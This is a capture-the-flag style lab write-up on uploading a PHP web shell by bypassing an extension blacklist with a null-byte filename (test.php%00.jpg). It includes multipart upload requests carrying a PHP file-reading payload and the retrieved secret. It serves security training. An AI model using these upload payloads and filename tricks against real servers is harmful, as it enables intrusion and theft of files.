# Web shell upload via obfuscated file extension

## This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

## To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

login using userid and password
upload a image and then upload exploite php file and intercept to repeater

```php
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

send request
result -> sorry, only JPG & PNG files are allowed
now
change content-type

```php
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/jpg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

send request
result -> sorry, only JPG & PNG files are allowed

### step2

### include a URL encoded null byte _%00_

### test.php%00.jpg

```php
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: image/jpg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

send request
result ->The file avatars/test.php has been uploaded
look for jpg file url which we uploaded
GET /files/avatars/meme.jpg HTTP/1.1
change to test.php
GET /files/avatars/test.php HTTP/1.1
send request
a3T2Ox6vJ2N4DaCUMzg6W2hSJaVNiRo1

lab solved
